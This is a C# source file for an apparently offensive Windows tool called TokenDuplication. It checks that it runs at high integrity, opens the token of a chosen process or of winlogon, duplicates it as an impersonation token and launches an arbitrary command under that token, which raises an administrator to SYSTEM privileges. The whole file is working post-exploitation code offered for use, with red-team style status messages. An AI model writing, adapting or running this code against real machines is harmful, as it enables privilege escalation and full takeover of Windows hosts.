using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using static TokenDuplication.Imports;

namespace TokenDuplication
{
    internal class Program
    {

        static void Main(string[] args)
        {
            try
            {

                IntPtr hToken = IntPtr.Zero;
                IntPtr duplicateToken = IntPtr.Zero;

                STARTUPINFO si = new STARTUPINFO();
                si.dwFlags = 1;
                si.wShowWindow = 1;
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();

                  if (!IsHighIntegrity())
                  {
                      Console.WriteLine("[!] Not running in high integrity");
                      return;
                  }

                IntPtr hProcess = IntPtr.Zero;
                int processToDuplicateTokenFrom = 0;
                string cmdline = "";
                Process proc = null;
                bool winlogon = false;

                try { 
                    processToDuplicateTokenFrom = int.Parse(args[0]);
                    cmdline = args[1];
                    proc = Process.GetProcessById(processToDuplicateTokenFrom);
                    hProcess = proc.Handle;
                }
                catch(ArgumentException) {
                    Console.WriteLine("[!] Did not find any process with pid " + processToDuplicateTokenFrom);
                    Console.WriteLine("[!] Using winlogon process instead ");
                    Process[] processes = Process.GetProcessesByName("winlogon");
                    hProcess = processes[0].Handle;
                    winlogon = true;
                }

                if (winlogon)
                {
                    Console.WriteLine("[+] Got handle for winlogon: " + hProcess);
                }
                else
                {
                    Console.WriteLine("[+] Got handle for " + processToDuplicateTokenFrom + ": " + hProcess);
                }
                hToken = IntPtr.Zero;
                // TOKEN_DUPLICATE = 0x0002
                if (!OpenProcessToken(hProcess, 0x0002, out hToken))
                {
                    Console.WriteLine("[!] OpenProcessToken with TOKEN_DUPLICATE access failed");
                    return;
                }

                Console.WriteLine("[+] Successfully opened the process token with TOKEN_DUPLICATE access. Handle: " + hToken);

                IntPtr hDupToken = IntPtr.Zero;

                STARTUPINFO sui = new STARTUPINFO();
                sui.dwFlags = 1;
                sui.wShowWindow = 1;

                // MAXIMUM_ALLOWED = 0x2000000

                if (!DuplicateTokenEx(hToken, 0x2000000, ref sa, 2, TOKEN_TYPE.TokenImpersonation, out duplicateToken))
                {
                    Console.WriteLine("[!] Duplicating the token with the MAXIUM_ALLOWED access rights and TokenImpersonation failed.");
                    return;
                }

                Console.WriteLine("[+] Duplicating the token with the MAXIUM_ALLOWED access rights and and TokenImpersonation succeeded.\n[+] Handle to the new duplicate token: " + duplicateToken);

                if (!CreateProcessWithTokenW(duplicateToken,
                    LogonFlags.NetCredentialsOnly,
                    null,
                    cmdline,
                    CreationFlags.DefaultErrorMode,
                    (IntPtr)0,
                    null,
                    ref sui,
                    out pi))
                {
                    var lastError = GetLastError();
                    Console.WriteLine("[!] CreateProcessWithTokenW error: {0}", lastError);
                    return;
                }

                Console.WriteLine("[+] " + cmdline + " successfully executed. Pid: " + pi.dwProcessId.ToString());


            }
            catch (IndexOutOfRangeException ex)
            {
                Console.WriteLine("Usage: {0} [PID to duplicate Token from] [Executable]", System.AppDomain.CurrentDomain.FriendlyName);
                Console.WriteLine("Example: {0} winlogon cmd.exe", System.AppDomain.CurrentDomain.FriendlyName);
            }
        }
    }

}